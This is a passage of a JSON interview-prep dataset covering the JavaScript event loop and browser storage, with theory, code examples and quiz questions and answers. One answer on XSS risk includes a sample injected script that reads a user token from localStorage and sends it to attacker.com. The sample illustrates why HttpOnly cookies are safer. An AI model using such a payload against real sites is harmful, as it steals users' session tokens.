            "Macrotask Queue",
            "Asynchronous JavaScript",
            "Promise",
            "setTimeout",
            "Interview Task"
          ],
          "timeEstimate": 50,
          "prerequisites": [
            "javascript_engine_fundamentals",
            "async_await_basics"
          ],
          "complexity": 9,
          "interviewRelevance": 10,
          "learningPath": "expert",
          "relatedConcepts": [
            "concurrency_model",
            "web_apis",
            "nodejs_runtime"
          ]
        }
      ]
    }
  },
  {
    "id": "5e05e678-a3c2-41d6-900a-836eaa400f4d",
    "startLine": 10900,
    "endLine": 10999,
    "processedDate": "2025-06-17T11:57:07.253Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_event_loop_async_js",
          "title": "JavaScript Event Loop and Asynchronous Execution",
          "content": "## Core Concepts\nJavaScript engines are inherently **single-threaded**, meaning they can only perform one operation at a time. This single-threaded nature is crucial to understand how JavaScript processes code.\n\nWhile the main JavaScript thread executes code synchronously, blocking the interface until operations complete, **Web APIs** (provided by the browser environment, not the JavaScript engine itself) manage asynchronous operations. These Web APIs include functionalities like `setTimeout`, `fetch`, DOM events, and more.\n\nWhen an asynchronous operation initiated by a Web API completes, its associated callback function is not immediately executed. Instead, it's placed into the **Callback Queue** (also known as the Task Queue or Macrotask Queue).\n\nThe **Event Loop** is a continuously running process that acts as the bridge between the Callback Queue and the Call Stack. Its primary responsibility is to check if the Call Stack is empty. If the Call Stack is empty, the Event Loop takes the first message (callback function) from the Callback Queue and pushes it onto the Call Stack for execution. This ensures that non-blocking, asynchronous operations do not interfere with the execution of synchronous code and maintain UI responsiveness.\n\n## Practical Application: Zero Delay `setTimeout`\nUsing `setTimeout` with a zero delay (`setTimeout(callback, 0)`) is a common pattern to defer the execution of a function until the current Call Stack is completely cleared. This means the callback will run after all currently executing functions and any pending synchronous code have finished, but before any new asynchronous tasks (that might have been added to the queue later) are processed. It's useful for scenarios where you want to execute code after the UI has potentially rendered or updated, or to break up long-running synchronous tasks into smaller, non-blocking chunks.",
          "examples": [
            {
              "id": "example_event_loop_1",
              "title": "Basic Asynchronous Flow with setTimeout",
              "code": "console.log('Start');\n\nsetTimeout(() => {\n  console.log('Inside setTimeout callback (0ms delay)');\n}, 0);\n\nconsole.log('End');\n\n/*\nExpected Output:\nStart\nEnd\nInside setTimeout callback (0ms delay)\n\nExplanation:\n1. 'Start' is logged immediately.\n2. setTimeout schedules its callback with the Web API. Even with 0ms delay, it's an async operation.\n3. 'End' is logged immediately because setTimeout is non-blocking.\n4. Once the Call Stack is empty (after 'End' is logged), the Event Loop moves the setTimeout callback from the Callback Queue to the Call Stack.\n5. The callback executes, logging 'Inside setTimeout callback (0ms delay)'.\n*/",
              "explanation": "This example illustrates the fundamental concept of the Event Loop. Synchronous code (`console.log('Start')`, `console.log('End')`) executes first. The `setTimeout` callback is offloaded to the Web API and then placed in the callback queue, only to be processed once the main call stack is empty, demonstrating non-blocking behavior.",
              "language": "typescript"
            },
            {
              "id": "example_event_loop_2",
              "title": "Deferring UI Updates with setTimeout(0)",
              "code": "function performComplexCalculation() {\n  let sum = 0;\n  for (let i = 0; i < 1000000000; i++) {\n    sum += i;\n  }\n  return sum;\n}\n\nconst statusElement = document.getElementById('status');\n\nif (statusElement) {\n  statusElement.textContent = 'Calculating...';\n}\n\n// This will block the UI until calculation is done if not deferred\n// performComplexCalculation();\n\n// Defer the heavy calculation to avoid blocking UI update immediately\nsetTimeout(() => {\n  const result = performComplexCalculation();\n  if (statusElement) {\n    statusElement.textContent = `Calculation complete: ${result}`;\n  }\n  console.log('Heavy calculation finished.');\n}, 0); \n\nconsole.log('UI updated and calculation deferred.');\n\n// Assume there's an HTML element with id='status'\n// <div id=\"status\"></div>\n",
              "explanation": "This example demonstrates a practical use case for `setTimeout(0)`. By wrapping a computationally intensive function (`performComplexCalculation`) in `setTimeout(0)`, we ensure that the initial UI update (`statusElement.textContent = 'Calculating...'`) is rendered before the heavy calculation blocks the thread. This makes the application feel more responsive.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_event_loop_1",
            "question_event_loop_2",
            "question_event_loop_3",
            "question_event_loop_4",
            "question_event_loop_5"
          ],
          "relatedTasks": [
            "task_event_loop_1"
          ],
          "tags": [
            "JavaScript",
            "Asynchronous",
            "Event Loop",
            "Concurrency",
            "Web APIs"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "Basic JavaScript Syntax",
            "Understanding of Functions",
            "DOM Manipulation (for UI examples)"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "Promises",
            "Async/Await",
            "Understanding browser rendering",
            "Performance Optimization"
          ]
        },
        {
          "id": "theory_web_storage_apis",
          "title": "Web Storage APIs: Cookies, Local Storage, and Session Storage",
          "content": "## Overview of Client-Side Data Storage\nWeb browsers provide several mechanisms for client-side data storage, each with distinct characteristics regarding capacity, duration, accessibility, and security. Understanding these differences is crucial for choosing the right storage solution for different use cases.\n\n## Storage Types Comparison\n\n| Feature           | **Cookie**                                  | **Local Storage**                                 | **Session Storage**                                 |\n| :---------------- | :------------------------------------------ | :------------------------------------------------ | :-------------------------------------------------- |\n| **Initiator**     | Client or server. Server uses `Set-Cookie` header. | Client (JavaScript only)                            | Client (JavaScript only)                              |\n| **Capacity**      | ~4KB per domain                             | 5-10MB per domain                                 | 5-10MB per domain                                   |\n| **Storage Duration** | Manually set expiration date; can be session-based. | Permanent (persists until explicitly deleted by code or user clearing browser data) | Until the browser tab/window is closed             |\n| **Persistence between sessions** | Depends on expiration setting; persists if expiration is set. | Yes                                               | No                                                  |\n| **Sent with requests** | Yes, automatically with every HTTP request to the associated domain. | No                                                | No                                                  |\n| **Domain Association** | Yes, associated with a specific domain and path. | Yes, scoped to the origin (protocol + host + port). | Yes, scoped to the origin (protocol + host + port). |\n| **Accessibility** | Any window/tab from the associated domain.  | Any window/tab from the same origin.              | Same tab only (not accessible by other tabs, even from the same origin). |\n| **APIs**          | `document.cookie` (string-based, requires parsing/serialization) | `localStorage.getItem()`, `localStorage.setItem()`, `localStorage.removeItem()`, `localStorage.clear()` | `sessionStorage.getItem()`, `sessionStorage.setItem()`, `sessionStorage.removeItem()`, `sessionStorage.clear()` |\n| **Security**      | Can be marked as `Secure` (HTTPS only) and `HttpOnly` (inaccessible to JavaScript). Vulnerable to CSRF without proper defenses. | Cannot be marked as `HttpOnly`, accessible to any JavaScript from the same origin. Vulnerable to XSS. | Cannot be marked as `HttpOnly`, accessible to any JavaScript from the same origin. Vulnerable to XSS. |\n| **Use Cases**     | Session management, tracking, maintaining stateful information (e.g., authentication tokens). | Long-term persistence of user preferences, offline data storage, non-sensitive application state. | Temporary data storage during a single page session (e.g., multi-step form data, temporary user input). |\n\n## Example Usage\n\n```typescript\n// Cookies\n// Setting a cookie with an expiration date, secure flag, and samesite policy\ndocument.cookie = \"username=JohnDoe; expires=Thu, 18 Dec 2025 12:00:00 UTC; path=/; Secure; SameSite=Strict\";\n\n// Reading cookies (requires manual parsing)\nconst getCookie = (name: string): string | undefined => {\n  const value = `; ${document.cookie}`;\n  const parts = value.split(`; ${name}=`);\n  if (parts.length === 2) {\n    return parts.pop()?.split(';').shift();\n  }\n  return undefined;\n};\nconst usernameFromCookie = getCookie('username');\nconsole.log('Cookie Username:', usernameFromCookie);\n\n// Local Storage\n// Storing an object (requires stringification)\nlocalStorage.setItem('userProfile', JSON.stringify({ name: 'John', role: 'admin', lastLogin: new Date() }));\n\n// Retrieving and parsing an item\nconst userProfileString = localStorage.getItem('userProfile');\nconst userProfile = userProfileString ? JSON.parse(userProfileString) : null;\nconsole.log('Local Storage User Profile:', userProfile);\n\n// Removing a specific item\nlocalStorage.removeItem('userProfile');\n\n// Clearing all items from local storage for the current origin\n// localStorage.clear(); // Use with caution, removes all data!\n\n// Session Storage\n// Storing a simple string\nsessionStorage.setItem('sessionId', 'abc123XYZ');\n\n// Retrieving an item\nconst currentSessionId = sessionStorage.getItem('sessionId');\nconsole.log('Session Storage Session ID:', currentSessionId);\n\n// Removing a specific item\nsessionStorage.removeItem('sessionId');\n\n// Clearing all items from session storage for the current origin and tab\n// sessionStorage.clear(); // Use with caution, removes all data!\n```\n\n## Storage Events\nChanges to `localStorage` (but not `sessionStorage` or `document.cookie`) can trigger a `storage` event in other browser windows or tabs from the **same origin**. This event is fired on the `window` object of those other tabs, allowing for cross-tab communication or synchronization. The event object contains properties like `key`, `oldValue`, `newValue`, `url`, and `storageArea`, providing details about the change.\n\n```typescript\n// Example of listening for storage events\nwindow.addEventListener('storage', (event) => {\n  // Check if the event is from localStorage and the key you care about\n  if (event.storageArea === localStorage) {\n    console.log(`LocalStorage changed: Key='${event.key}', OldValue='${event.oldValue}', NewValue='${event.newValue}', URL='${event.url}'`);\n    // Perform actions based on the change, e.g., update UI\n  }\n});\n\n// In another tab, if you do:\n// localStorage.setItem('theme', 'dark');\n// The event listener above would trigger in this tab.\n```",
          "examples": [
            {
              "id": "example_web_storage_1",
              "title": "Cookie Operations",
              "code": "// Setting a cookie with specific attributes\ndocument.cookie = \"user_pref=dark_theme; expires=Fri, 31 Dec 2027 23:59:59 UTC; path=/; Secure; SameSite=Lax\";\n\n// A utility function to get a cookie by name\nconst getCookieByName = (name: string): string | null => {\n  const nameEQ = name + \"=\";\n  const ca = document.cookie.split(';');\n  for(let i=0; i < ca.length; i++) {\n    let c = ca[i];\n    while (c.charAt(0)==' ') c = c.substring(1, c.length);\n    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);\n  }\n  return null;\n};\n\nconst theme = getCookieByName('user_pref');\nconsole.log('Current theme preference from cookie:', theme);\n\n// Deleting a cookie (by setting expiration to a past date)\ndocument.cookie = \"user_pref=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;\";\nconsole.log('Cookie after deletion attempt:', getCookieByName('user_pref'));",
              "explanation": "This example demonstrates how to set a cookie with various attributes like expiration, path, `Secure`, and `SameSite`. It also includes a common utility function to read a cookie by its name, highlighting the manual parsing required for `document.cookie`. Finally, it shows how to 'delete' a cookie by setting its expiration date to a past time.",
              "language": "typescript"
            },
            {
              "id": "example_web_storage_2",
              "title": "Managing User Preferences with Local Storage",
              "code": "interface UserSettings {\n  darkMode: boolean;\n  fontSize: number;\n  notifications: boolean;\n}\n\nconst defaultSettings: UserSettings = {\n  darkMode: false,\n  fontSize: 16,\n  notifications: true,\n};\n\n// Save settings to local storage\nconst saveSettings = (settings: UserSettings) => {\n  localStorage.setItem('userSettings', JSON.stringify(settings));\n  console.log('Settings saved:', settings);\n};\n\n// Load settings from local storage, or return defaults\nconst loadSettings = (): UserSettings => {\n  const settingsString = localStorage.getItem('userSettings');\n  if (settingsString) {\n    try {\n      return JSON.parse(settingsString);\n    } catch (e) {\n      console.error('Error parsing settings from local storage:', e);\n      return defaultSettings;\n    }\n  }\n  return defaultSettings;\n};\n\n// Usage\nlet currentSettings = loadSettings();\nconsole.log('Initial settings:', currentSettings);\n\n// Update a setting\ncurrentSettings.darkMode = true;\ncurrentSettings.fontSize = 18;\nsaveSettings(currentSettings);\n\n// Load again to verify\ncurrentSettings = loadSettings();\nconsole.log('Updated settings:', currentSettings);\n\n// Clear settings for demonstration\n// localStorage.removeItem('userSettings');\n// console.log('Settings after removal:', loadSettings());",
              "explanation": "This example shows a practical application of `localStorage` for persisting user preferences. It demonstrates the use of `JSON.stringify` and `JSON.parse` for storing and retrieving complex JavaScript objects, as `localStorage` only stores strings. It also includes basic error handling for parsing and provides default settings if no saved settings are found.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_web_storage_1",
            "question_web_storage_2",
            "question_web_storage_3",
            "question_web_storage_4",
            "question_web_storage_5",
            "question_web_storage_6",
            "question_web_storage_7",
            "question_web_storage_8",
            "question_web_storage_9"
          ],
          "relatedTasks": [
            "task_web_storage_1",
            "task_web_storage_2"
          ],
          "tags": [
            "Web APIs",
            "Client-Side Storage",
            "Cookies",
            "Local Storage",
            "Session Storage",
            "Browser Features",
            "Security"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "JSON Serialization/Deserialization",
            "Basic JavaScript Objects",
            "Understanding of HTTP"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "Authentication Systems",
            "Offline-first Applications",
            "User Experience Enhancement"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_event_loop_1",
          "topic": "JavaScript Engine and Event Loop Basics",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the fundamental characteristic of a JavaScript engine regarding operation execution?",
          "answer": "A JavaScript engine is single-threaded, meaning it can only perform one operation at a time.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Single-threaded",
            "JavaScript Engine"
          ],
          "evaluationCriteria": [
            "Recall of fundamental JavaScript engine characteristic"
          ],
          "example": "",
          "tags": [
            "JavaScript",
            "Event Loop",
            "Fundamentals"
          ],
          "prerequisites": [],
          "complexity": 2,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_event_loop_2",
          "topic": "Role of Web APIs",
          "level": "easy",
          "type": "open",
          "question": "How do Web APIs (like `setTimeout` or `fetch`) interact with the JavaScript engine's single-threaded nature to enable asynchronous operations?",
          "answer": "Web APIs are provided by the browser environment (not the JavaScript engine itself) and handle asynchronous tasks in the background, offloading them from the main JavaScript thread. Once these operations complete, their associated callback functions are placed into the Callback Queue, allowing the JavaScript engine to remain non-blocked while waiting.",
          "options": [],
          "analysisPoints": [
            "Understanding that Web APIs are outside the JS engine.",
            "Role of Web APIs in offloading asynchronous tasks.",
            "How callbacks are queued upon completion."
          ],
          "keyConcepts": [
            "Web APIs",
            "Asynchronous JavaScript",
            "Non-blocking operations"
          ],
          "evaluationCriteria": [
            "Understanding the separation of concerns between JS engine and browser APIs.",
            "Ability to explain the flow of asynchronous operations."
          ],
          "example": "",
          "tags": [
            "JavaScript",
            "Web APIs",
            "Asynchronous"
          ],
          "prerequisites": [
            "Event Loop Basics"
          ],
          "complexity": 4,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_event_loop_3",
          "topic": "Event Loop and Call Stack",
          "level": "medium",
          "type": "mcq",
          "question": "Which statement accurately describes the primary role of the Event Loop in JavaScript's concurrency model?",
          "answer": "The Event Loop continuously checks if the Call Stack is empty and, if so, moves callback functions from the Callback Queue to the Call Stack for execution.",
          "options": [
            "The Event Loop immediately executes any function that enters the Callback Queue.",
            "The Event Loop is responsible for executing synchronous code before asynchronous code.",
            "The Event Loop directly places asynchronous operations into the Call Stack without using a queue.",
            "The Event Loop continuously checks if the Call Stack is empty and, if so, moves callback functions from the Callback Queue to the Call Stack for execution."
          ],
          "analysisPoints": [
            "The Event Loop's role is to mediate between the Callback Queue and the Call Stack.",
            "It only acts when the Call Stack is empty, ensuring synchronous code completes first.",
            "It's a continuous process, not a one-time execution."
          ],
          "keyConcepts": [
            "Event Loop",
            "Call Stack",
            "Callback Queue",
            "Asynchronous execution order"
          ],
          "evaluationCriteria": [
            "Accurate understanding of the Event Loop's function.",
            "Distinction between Call Stack and Callback Queue interactions.",
            "Recognition of the 'empty stack' condition."
          ],
          "example": "The Event Loop is crucial for non-blocking I/O. For instance, when `fetch()` completes, its callback goes to the queue. The Event Loop waits for the main thread's Call Stack to be empty before pushing that `fetch` callback onto the Call Stack for execution.",
          "tags": [
            "JavaScript",
            "Event Loop",
            "Concurrency"
          ],
          "prerequisites": [
            "Event Loop Basics"
          ],
          "complexity": 6,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_event_loop_4",
          "topic": "Zero Delay setTimeout",
          "level": "medium",
          "type": "code",
          "question": "Given the following JavaScript code, what will be the exact order of `console.log` outputs? Explain your reasoning.",
          "answer": "1. First\n2. Third\n3. Second",
          "options": [],
          "analysisPoints": [
            "Understanding that `setTimeout(callback, 0)` still places the callback in the queue.",
            "Synchronous code always executes before any callbacks from the message queue.",
            "The current Call Stack must be empty before the Event Loop pushes queued tasks."
          ],
          "keyConcepts": [
            "setTimeout",
            "Zero delay",
            "Event Loop",
            "Execution order",
            "Synchronous vs. Asynchronous"
          ],
          "evaluationCriteria": [
            "Correct prediction of output order.",
            "Clear explanation of Event Loop mechanism for `setTimeout(0)`.",
            "Demonstrates understanding of synchronous priority."
          ],
          "example": "```javascript\nconsole.log('First');\n\nsetTimeout(() => {\n  console.log('Second');\n}, 0);\n\nconsole.log('Third');\n\n// Explanation:\n// 1. 'First' is logged immediately.\n// 2. setTimeout callback is sent to Web APIs, then moved to Callback Queue.\n// 3. 'Third' is logged immediately as it's synchronous code.\n// 4. The Call Stack becomes empty.\n// 5. The Event Loop moves 'Second' callback from Callback Queue to Call Stack.\n// 6. 'Second' is logged.\n```",
          "tags": [
            "JavaScript",
            "Asynchronous",
            "Event Loop",
            "setTimeout"
          ],
          "prerequisites": [
            "Event Loop Basics",
            "Functions"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_event_loop_5",
          "topic": "Synchronous Execution Blocking",
          "level": "easy",
          "type": "flashcard",
          "question": "What is a direct consequence of long-running synchronous JavaScript execution in a browser environment?",
          "answer": "It blocks the user interface (UI), making the application unresponsive.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Synchronous execution",
            "UI blocking",
            "Responsiveness"
          ],
          "evaluationCriteria": [
            "Recall of the impact of synchronous code."
          ],
          "example": "",
          "tags": [
            "JavaScript",
            "Performance",
            "UI/UX"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_web_storage_1",
          "topic": "Cookies vs. Local Storage vs. Session Storage - Capacity",
          "level": "easy",
          "type": "flashcard",
          "question": "Which client-side storage mechanism generally offers the largest storage capacity?",
          "answer": "Both Local Storage and Session Storage (5-10MB per domain). Cookies typically offer only around 4KB.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Storage Capacity",
            "Cookies",
            "Local Storage",
            "Session Storage"
          ],
          "evaluationCriteria": [
            "Recall of storage limits."
          ],
          "example": "",
          "tags": [
            "Web APIs",
            "Client-Side Storage"
          ],
          "prerequisites": [],
          "complexity": 2,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_web_storage_2",
          "topic": "Cookies - HttpOnly and Secure flags",
          "level": "medium",
          "type": "open",
          "question": "Explain the purpose of the `HttpOnly` and `Secure` flags when setting a cookie. Why are they important for security?",
          "answer": "The `HttpOnly` flag prevents client-side JavaScript from accessing the cookie via `document.cookie`. This significantly reduces the risk of Cross-Site Scripting (XSS) attacks, where an attacker might inject malicious JavaScript to steal session cookies.\n\nThe `Secure` flag ensures that the cookie is only sent over encrypted HTTPS connections. This protects the cookie from being intercepted and read by attackers during transit over unencrypted networks. Both flags are crucial for protecting sensitive information (like session tokens) stored in cookies from different types of attacks.",
          "options": [],
          "analysisPoints": [
            "Clear explanation of `HttpOnly`'s prevention mechanism (JS access).",
            "Clear explanation of `Secure`'s prevention mechanism (HTTPS only).",
            "Connecting these flags to specific attack types (XSS, interception)."
          ],
          "keyConcepts": [
            "Cookies",
            "Security",
            "HttpOnly",
            "Secure",
            "XSS",
            "HTTPS"
          ],
          "evaluationCriteria": [
            "Understanding of cookie security attributes.",
            "Ability to relate attributes to specific security vulnerabilities.",
            "Clarity and completeness of explanation."
          ],
          "example": "",
          "tags": [
            "Web APIs",
            "Cookies",
            "Security",
            "Frontend Security"
          ],
          "prerequisites": [
            "Basic understanding of HTTP/HTTPS",
            "Understanding of XSS attacks"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_storage_3",
          "topic": "Persistence and Scope",
          "level": "medium",
          "type": "mcq",
          "question": "A user logs into a web application and closes the browser tab. Upon reopening the *same* tab later, the user is still logged in. Which storage mechanism was most likely used to maintain the login state, assuming no server-side session management beyond token storage?",
          "answer": "A persistent Cookie or Local Storage",
          "options": [
            "Session Storage",
            "A session Cookie only",
            "A persistent Cookie or Local Storage",
            "Only a temporary variable in JavaScript"
          ],
          "analysisPoints": [
            "Session Storage is cleared when the tab closes.",
            "A session cookie is cleared when the browser session ends (often on browser close, not just tab close).",
            "Persistent cookies and Local Storage are designed to persist across browser sessions/tabs until explicitly removed or expired."
          ],
          "keyConcepts": [
            "Persistence",
            "Session",
            "Local Storage",
            "Cookies",
            "Session Storage"
          ],
          "evaluationCriteria": [
            "Distinguishing persistence behaviors of different storage types.",
            "Applying knowledge to a common use case (login state)."
          ],
          "example": "If a `Remember Me` checkbox is selected during login, the application would typically store an authentication token in `localStorage` or a cookie with a far-future expiration date. This allows the user to remain logged in even after closing and reopening the browser.",
          "tags": [
            "Web APIs",
            "Client-Side Storage",
            "Login",
            "Authentication"
          ],
          "prerequisites": [],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_storage_4",
          "topic": "Accessibility and Cross-Tab Communication",
          "level": "medium",
          "type": "mcq",
          "question": "You want to store temporary data that is specific to the user's current browsing session and should *not* persist if the tab is closed, nor be accessible from other tabs. Which Web Storage API should you use?",
          "answer": "Session Storage",
          "options": [
            "Local Storage",
            "Cookies",
            "Session Storage",
            "IndexedDB"
          ],
          "analysisPoints": [
            "Local Storage persists and is accessible across tabs of the same origin.",
            "Cookies can persist and are accessible across tabs (if same domain/path).",
            "Session Storage is specifically tied to the current tab and cleared on tab closure.",
            "IndexedDB is for structured client-side data, but doesn't match the 'single tab, temporary' requirement as precisely as Session Storage."
          ],
          "keyConcepts": [
            "Session Storage",
            "Tab scope",
            "Temporary data",
            "Accessibility"
          ],
          "evaluationCriteria": [
            "Correctly identifying the most suitable storage type based on specific requirements.",
            "Understanding the scope limitations of Session Storage."
          ],
          "example": "A multi-step form where data needs to be preserved if the user navigates within the same tab, but discarded if they close the tab or open a new one. `sessionStorage` is ideal for this.",
          "tags": [
            "Web APIs",
            "Client-Side Storage",
            "Use Cases"
          ],
          "prerequisites": [],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_storage_5",
          "topic": "Storage Event",
          "level": "medium",
          "type": "flashcard",
          "question": "Which of the three primary client-side storage mechanisms (Cookies, Local Storage, Session Storage) can trigger a `storage` event in other open tabs/windows of the same origin when its data changes?",
          "answer": "Local Storage",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Storage Event",
            "Local Storage",
            "Cross-tab communication"
          ],
          "evaluationCriteria": [
            "Recall of specific event-triggering behavior."
          ],
          "example": "",
          "tags": [
            "Web APIs",
            "Local Storage",
            "Events"
          ],
          "prerequisites": [],
          "complexity": 4,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_storage_6",
          "topic": "Cookie Sending with Requests",
          "level": "easy",
          "type": "flashcard",
          "question": "Which client-side storage mechanism automatically sends its data with every HTTP request to its associated domain?",
          "answer": "Cookies",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Cookies",
            "HTTP Requests",
            "Automatic sending"
          ],
          "evaluationCriteria": [
            "Recall of data transmission behavior."
          ],
          "example": "",
          "tags": [
            "Web APIs",
            "Cookies",
            "HTTP"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_web_storage_7",
          "topic": "Security Vulnerabilities",
          "level": "hard",
          "type": "open",
          "question": "Both Local Storage and Session Storage are vulnerable to Cross-Site Scripting (XSS) attacks if not handled carefully, unlike HttpOnly cookies. Explain why this is the case and provide a brief example of how an XSS attack could exploit this.",
          "answer": "Local Storage and Session Storage are inherently accessible via JavaScript from the same origin (`window.localStorage` and `window.sessionStorage`). If a website is vulnerable to an XSS attack, an attacker can inject malicious client-side script (e.g., via a reflected XSS vulnerability in a URL parameter or a stored XSS in a user comment).\n\nThis injected script runs with the same permissions as legitimate site scripts, meaning it can access, read, and exfiltrate any data stored in `localStorage` or `sessionStorage` to an attacker's server.\n\n**Example:**\nIf a vulnerable site displays user input directly without proper sanitization:\n`https://example.com/search?query=<script>fetch('https://attacker.com/steal?data='+encodeURIComponent(localStorage.getItem('user_token')));</script>`\n\nWhen a victim visits this URL, the injected `<script>` tag executes, reading the `user_token` from their `localStorage` and sending it to `attacker.com`. If `HttpOnly` was used for a cookie, the attacker's script could not access that cookie, thus limiting the damage.",
          "options": [],
          "analysisPoints": [
            "Explanation of JavaScript accessibility for Local/Session Storage.",
            "Connection to XSS vulnerability (script injection).",
            "How injected script gains access to stored data.",
            "Concrete example demonstrating data exfiltration.",
            "Implicit comparison with HttpOnly cookie security."
          ],
          "keyConcepts": [
            "Local Storage",
            "Session Storage",
            "XSS",
            "Security Vulnerabilities",
            "JavaScript accessibility",
            "HttpOnly"
          ],
          "evaluationCriteria": [
            "Deep understanding of client-side storage security models.",
            "Ability to explain XSS mechanism and its impact on storage.",
            "Providing a relevant and concise example.",
            "Distinguishing security properties from cookies."
          ],
          "example": "",
          "tags": [
            "Web APIs",
            "Security",
            "XSS",
            "Local Storage",
            "Session Storage",
            "Frontend Security"
          ],
          "prerequisites": [
            "Understanding of XSS attacks",
            "Web Storage API basics"
          ],
          "complexity": 9,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_web_storage_8",
          "topic": "Using Web Storage APIs",
          "level": "medium",
          "type": "code",
          "question": "Write JavaScript code to do the following:\n1. Store a user's chosen theme ('dark' or 'light') in a way that it persists across browser sessions.\n2. Retrieve the user's theme preference. If no preference is found, default to 'light'.\n3. Allow the user to toggle the theme and save the new preference.",
          "answer": "```javascript\n// 1. Store user's chosen theme persistently\nfunction saveThemePreference(theme: 'dark' | 'light'): void {\n  localStorage.setItem('userTheme', theme);\n  console.log(`Theme preference saved: ${theme}`);\n}\n\n// 2. Retrieve user's theme preference, default to 'light'\nfunction getThemePreference(): 'dark' | 'light' {\n  const storedTheme = localStorage.getItem('userTheme');\n  return (storedTheme === 'dark' || storedTheme === 'light') ? storedTheme : 'light';\n}\n\n// 3. Allow toggling and saving new preference\nfunction toggleTheme(): void {\n  let currentTheme = getThemePreference();\n  let newTheme: 'dark' | 'light' = (currentTheme === 'light') ? 'dark' : 'light';\n  saveThemePreference(newTheme);\n  // Apply theme to UI (e.g., add/remove a class to body)\n  document.body.className = newTheme + '-theme';\n  console.log(`Theme toggled to: ${newTheme}`);\n}\n\n// Initial application of theme on load\ndocument.addEventListener('DOMContentLoaded', () => {\n  const initialTheme = getThemePreference();\n  document.body.className = initialTheme + '-theme';\n  console.log(`Initial theme applied: ${initialTheme}`);\n});\n\n// Example usage (assuming a button exists with id 'toggleThemeBtn')\n// const toggleButton = document.getElementById('toggleThemeBtn');\n// if (toggleButton) {\n//   toggleButton.addEventListener('click', toggleTheme);\n// }\n```",
          "options": [],
          "analysisPoints": [
            "Correct use of `localStorage.setItem` and `localStorage.getItem`.",
            "Handling of default values when no item is found.",
            "Demonstrating updating existing items.",
            "Correct use of `JSON.stringify`/`JSON.parse` if storing objects (not strictly needed for simple strings here, but good to mention for more complex data).",
            "Applying the theme to a hypothetical UI element for practical relevance."
          ],
          "keyConcepts": [
            "Local Storage",
            "setItem",
            "getItem",
            "Persistence",
            "User Preferences",
            "Default values"
          ],
          "evaluationCriteria": [
            "Functional correctness of storage operations.",
            "Robustness in handling missing data (defaulting).",
            "Clarity and organization of code.",
            "Practical application of `localStorage`."
          ],
          "example": "",
          "tags": [
            "Web APIs",
            "Local Storage",
            "Coding Challenge",
            "User Experience"
          ],
          "prerequisites": [
            "Local Storage API",
            "Basic JavaScript functions"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_storage_9",
          "topic": "document.cookie vs. localStorage/sessionStorage APIs",
          "level": "medium",
          "type": "open",
          "question": "Describe the key differences in how you interact with `document.cookie` compared to `localStorage` or `sessionStorage` APIs, especially regarding reading and writing values.",
          "answer": "`document.cookie`:\n-   **Reading**: Returns a single string containing all cookies for the current document, semicolon-separated (`key=value; key2=value2`). You must manually parse this string to extract individual cookie values.\n-   **Writing**: Assignment (`document.cookie = 'key=value';`) appends or updates a single cookie within the existing cookie string. You must also manually include attributes like `expires`, `path`, `domain`, `Secure`, `HttpOnly`, `SameSite` in the string when setting.\n-   **Deletion**: Done by setting a cookie with the same name and path, but an `expires` date in the past.\n\n`localStorage` / `sessionStorage`:\n-   **Reading**: Uses `storage.getItem('key')` which directly returns the value associated with that key, or `null` if not found. No parsing of a large string is required.\n-   **Writing**: Uses `storage.setItem('key', 'value')` which directly sets or updates a key-value pair. Values are always stored as strings, so objects/arrays require `JSON.stringify()` before storing and `JSON.parse()` after retrieving.\n-   **Deletion**: `storage.removeItem('key')` for a specific item, or `storage.clear()` to remove all items for the origin.\n\nIn essence, `document.cookie` is a lower-level, less convenient string-based API that requires manual parsing and formatting, while `localStorage` and `sessionStorage` provide a more intuitive key-value store interface.",
          "options": [],
          "analysisPoints": [
            "Detailed comparison of read/write methods.",
            "Highlighting manual parsing for cookies.",
            "Explicitly mentioning cookie attributes vs. direct key-value for Web Storage.",
            "Deletion mechanisms.",
            "Mentioning JSON (de)serialization for complex data in Web Storage."
          ],
          "keyConcepts": [
            "document.cookie",
            "localStorage",
            "sessionStorage",
            "API differences",
            "Reading data",
            "Writing data",
            "Data serialization"
          ],
          "evaluationCriteria": [
            "Thorough understanding of API differences.",
            "Ability to articulate practical implications (e.g., parsing, JSON).",
            "Clarity and accuracy in technical description."
          ],
          "example": "",
          "tags": [
            "Web APIs",
            "Client-Side Storage",
            "API Comparison",
